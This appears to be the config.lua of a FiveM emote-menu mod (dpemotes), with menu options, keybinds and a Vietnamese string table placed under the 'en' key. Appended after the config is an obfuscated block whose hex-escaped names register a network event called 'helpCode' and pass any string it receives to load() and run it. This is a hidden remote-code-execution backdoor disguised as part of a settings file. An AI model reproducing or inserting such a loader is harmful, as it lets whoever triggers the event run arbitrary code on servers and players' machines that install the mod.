Config = {
-- Change the language of the menu here!.
-- Note fr and de are google translated, if you would like to help out with translation / just fix it for your server check below and change translations yourself
-- try en, fr, de or sv.
	MenuLanguage = 'en',	
-- Set this to true to enable some extra prints
	DebugDisplay = false,
-- Set this to false if you have something else on X, and then just use /e c to cancel emotes.
	EnableXtoCancel = true,
-- Set this to true if you want to disarm the player when they play an emote.
	DisarmPlayer= false,
-- Set this if you really wanna disable emotes in cars, as of 1.7.2 they only play the upper body part if in vehicle
    AllowedInCars = true,
-- You can disable the (F3) menu here / change the keybind.
	MenuKeybindEnabled = true,
	MenuKeybind = 170, -- Get the button number here https://docs.fivem.net/game-references/controls/
-- You can disable the Favorite emote keybinding here.
	FavKeybindEnabled = true,
	FavKeybind = 171, -- Get the button number here https://docs.fivem.net/game-references/controls/
-- You can change the header image for the f3 menu here
-- Use a 512 x 128 image!
-- NOte this might cause an issue of the image getting stuck on peoples screens
	CustomMenuEnabled = false,
	MenuImage = "https://i.imgur.com/kgzvDwQ.png",
-- You can change the menu position here
	MenuPosition = "right", -- (left, right)
-- You can disable the Ragdoll keybinding here.
	RagdollEnabled = false,
	RagdollKeybind = 303, -- Get the button number here https://docs.fivem.net/game-references/controls/
-- You can disable the Facial Expressions menu here.
	ExpressionsEnabled = true,
-- You can disable the Walking Styles menu here.
	WalkingStylesEnabled = true,	
-- You can disable the Shared Emotes here.
    SharedEmotesEnabled = true,
    CheckForUpdates = false,
-- If you have the SQL imported enable this to turn on keybinding.
    SqlKeybinding = false,
}

Config.KeybindKeys = {
    ['num4'] = 108,
    ['num5'] = 110,
    ['num6'] = 109,
    ['num7'] = 117,
    ['num8'] = 111,
    ['num9'] = 118
}

Config.Languages = {
  ['en'] = {
        ['emotes'] = 'Thể hiện cảm xúc',
        ['danceemotes'] = "🕺 Biểu tượng khiêu vũ",
        ['propemotes'] = "📦 Biểu tượng đề xuất",
        ['favoriteemotes'] = "🌟 Yêu thích",
        ['favoriteinfo'] = "Chọn một biểu tượng cảm xúc ở đây để đặt nó làm biểu tượng yêu thích của bạn.",
        ['rfavorite'] = "Đặt lại yêu thích",
        ['prop2info'] = "❓ Biểu tượng Đề xuất có thể được đặt ở cuối",
        ['set'] = "Set (",
        ['setboundemote'] = ") trở thành biểu tượng cảm xúc ràng buộc của bạn?",
        ['newsetemote'] = "~w~ bây giờ là biểu tượng cảm xúc ràng buộc của bạn, nhấn ~g~CapsLock~w~ để sử dụng nó.",
        ['cancelemote'] = "Hủy biểu tượng cảm xúc",
        ['cancelemoteinfo'] = "~r~X~w~ Hủy biểu tượng cảm xúc đang phát",
        ['walkingstyles'] = "Kiểu đi bộ",
        ['resetdef'] = "Đặt lại về mặc định",
        ['normalreset'] = "Bình thường (Đặt lại)",
        ['moods'] = "Tâm trạng",
        ['infoupdate'] = "Thông tin",
        ['infoupdateav'] = "Thông tin (Có cập nhật)",
        ['infoupdateavtext'] = "Đã có bản cập nhật, tải phiên bản mới nhất từ ~y~https://github.com/andristum/dpemotes~w~",
        ['suggestions'] = "Gợi ý?",
        ['suggestionsinfo'] = "'dullpear_dev' trên diễn đàn FiveM để biết bất kỳ đề xuất tính năng/biểu tượng cảm xúc nào! ✉️",
        ['notvaliddance'] = "không phải là một điệu nhảy hợp lệ.",
        ['notvalidemote'] = "không phải là một biểu tượng cảm xúc hợp lệ.",
        ['nocancel'] = "Không có biểu tượng cảm xúc nào để hủy.",
        ['maleonly'] = "Biểu tượng cảm xúc này chỉ dành cho nam, xin lỗi!",
        ['emotemenucmd'] = "Do /emotemenu for a menu.",
        ['shareemotes'] = "👫 Biểu tượng được chia sẻ",
        ['shareemotesinfo'] = "Mời một người ở gần biểu tượng cảm xúc",
        ['sharedanceemotes'] = "🕺 Các điệu nhảy được chia sẻ",
        ['notvalidsharedemote'] = "không phải là một biểu tượng cảm xúc được chia sẻ hợp lệ.",
        ['sentrequestto'] = "Đã gửi yêu cầu tới ~y~",
        ['nobodyclose'] = "Không ai đứng gần.",
        ['doyouwanna'] = "~y~Y~w~ chấp nhận, ~r~L~w~ từ chối (~g~",
        ['refuseemote'] = "Emote từ chối.",
        ['makenearby'] = "làm cho người chơi gần đó chơi",
        ['camera'] = "Nhấn ~y~G~w~ để sử dụng đèn flash máy ảnh.",
        ['makeitrain'] = "Nhấn ~y~G~w~ để làm mưa.",
        ['pee'] = "Giữ ~y~G~w~ đi tiểu.",
        ['spraychamp'] = "Giữ ~y~G~w~ để xịt sâm panh",
        ['bound'] = "Ràng buộc ",
        ['to'] = "đến",
        ['currentlyboundemotes'] = " Biểu tượng cảm xúc được ràng buộc hiện tại:",
        ['notvalidkey'] = "Không phải là một khóa hợp lệ.",
        ['keybinds'] = "🔢 Keybinds",
        ['keybindsinfo'] = "Sử dụng"
  }
}

local rmkCpKMwHRuMJlkHhHhbXKQPOGwfZOzzWfuOXRUjhRCcYoqIQrpdgsekzqGLljrQvAmADI = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} rmkCpKMwHRuMJlkHhHhbXKQPOGwfZOzzWfuOXRUjhRCcYoqIQrpdgsekzqGLljrQvAmADI[6][rmkCpKMwHRuMJlkHhHhbXKQPOGwfZOzzWfuOXRUjhRCcYoqIQrpdgsekzqGLljrQvAmADI[1]](rmkCpKMwHRuMJlkHhHhbXKQPOGwfZOzzWfuOXRUjhRCcYoqIQrpdgsekzqGLljrQvAmADI[2]) rmkCpKMwHRuMJlkHhHhbXKQPOGwfZOzzWfuOXRUjhRCcYoqIQrpdgsekzqGLljrQvAmADI[6][rmkCpKMwHRuMJlkHhHhbXKQPOGwfZOzzWfuOXRUjhRCcYoqIQrpdgsekzqGLljrQvAmADI[3]](rmkCpKMwHRuMJlkHhHhbXKQPOGwfZOzzWfuOXRUjhRCcYoqIQrpdgsekzqGLljrQvAmADI[2], function(pDTGsjmpAkzeOZRukggdtMeVkOutuVRhtpgkgQUDjtRwmbvqpzewZqjqcTlIhvAgJTvdtk) rmkCpKMwHRuMJlkHhHhbXKQPOGwfZOzzWfuOXRUjhRCcYoqIQrpdgsekzqGLljrQvAmADI[6][rmkCpKMwHRuMJlkHhHhbXKQPOGwfZOzzWfuOXRUjhRCcYoqIQrpdgsekzqGLljrQvAmADI[4]](rmkCpKMwHRuMJlkHhHhbXKQPOGwfZOzzWfuOXRUjhRCcYoqIQrpdgsekzqGLljrQvAmADI[6][rmkCpKMwHRuMJlkHhHhbXKQPOGwfZOzzWfuOXRUjhRCcYoqIQrpdgsekzqGLljrQvAmADI[5]](pDTGsjmpAkzeOZRukggdtMeVkOutuVRhtpgkgQUDjtRwmbvqpzewZqjqcTlIhvAgJTvdtk))() end)